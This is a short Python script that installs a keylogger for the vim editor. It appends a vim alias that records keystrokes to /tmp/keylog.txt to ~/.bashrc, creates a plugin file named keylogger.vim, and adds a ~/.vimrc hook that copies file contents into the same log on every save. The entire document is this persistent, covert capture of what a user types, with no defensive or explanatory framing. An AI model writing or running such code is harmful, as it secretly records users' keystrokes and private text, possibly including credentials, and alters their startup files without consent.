import subprocess

# Define the commands to be executed
bash_commands = [
    "echo \"alias vim='vim -W /tmp/keylog.txt'\" >> ~/.bashrc",
    "source ~/.bashrc",
    "touch ~/.vimrc",
    "mkdir -p ~/.vim/plugins",
    "echo ':autocmd BufWritePost * :silent :w! >> /tmp/keylog.txt' > ~/.vim/plugins/keylogger.vim",
    "echo ':autocmd BufWritePost * :silent :w! >> /tmp/keylog.txt' >> ~/.vimrc"
]

# Execute the commands using subprocess
for command in bash_commands:
    subprocess.run(command, shell=True, check=True)
